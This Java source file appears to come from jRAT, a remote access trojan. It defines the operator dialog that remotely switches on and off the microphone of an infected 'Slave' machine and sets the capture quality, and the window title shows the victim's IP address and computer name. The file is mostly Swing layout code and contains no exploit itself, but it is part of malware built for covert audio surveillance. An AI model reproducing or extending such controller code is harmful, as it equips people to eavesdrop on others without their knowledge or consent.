package su.jrat.client.ui.dialogs;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;

import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;

import su.jrat.client.Slave;
import su.jrat.client.packets.incoming.Packet58SoundCapture;
import su.jrat.client.packets.outgoing.Packet84SoundCapture;


@SuppressWarnings({ "serial", "rawtypes", "unchecked" })
public class DialogRemoteSoundCapture extends BaseDialog {

	private JPanel contentPane;
	private Slave slave;
	private JButton btnStart;
	private JButton btnStop;
	public Packet58SoundCapture packet;

	public static HashMap<Slave, DialogRemoteSoundCapture> instances = new HashMap<Slave, DialogRemoteSoundCapture>();
	private JComboBox comboBox;

	public DialogRemoteSoundCapture(Slave sl) {
		super();
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setResizable(false);
		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogRemoteSoundCapture.class.getResource("/icons/microphone.png")));
		this.slave = sl;
		packet = new Packet58SoundCapture();
		instances.put(slave, this);
		setTitle("Sound capture - " + sl.getIP() + " - " + sl.getComputerName());
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 332, 67);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		btnStart = new JButton("Start");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet84SoundCapture(true));
				btnStart.setEnabled(false);
				btnStop.setEnabled(true);
				comboBox.setEnabled(false);
			}
		});
		btnStart.setIcon(new ImageIcon(DialogRemoteSoundCapture.class.getResource("/icons/microphone_plus.png")));

		btnStop = new JButton("Stop");
		btnStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				slave.addToSendQueue(new Packet84SoundCapture(false));

				btnStart.setEnabled(true);
				btnStop.setEnabled(false);
				comboBox.setEnabled(true);
			}
		});
		btnStop.setEnabled(false);
		btnStop.setIcon(new ImageIcon(DialogRemoteSoundCapture.class.getResource("/icons/microphone_minus.png")));

		comboBox = new JComboBox();
		comboBox.setModel(new DefaultComboBoxModel(new String[] { "16000", "12000", "8000", "4000", "2000" }));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(btnStart).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnStop).addPreferredGap(ComponentPlacement.RELATED).addComponent(comboBox, 0, 132, Short.MAX_VALUE).addContainerGap()));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnStart).addComponent(btnStop).addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		contentPane.setLayout(gl_contentPane);
	}

	public boolean isRunning() {
		return btnStop.isEnabled();
	}

	public int getQuality() {
		return Integer.parseInt(comboBox.getSelectedItem().toString());
	}

	public void exit() {
		instances.remove(slave);
		packet.close();
	}
}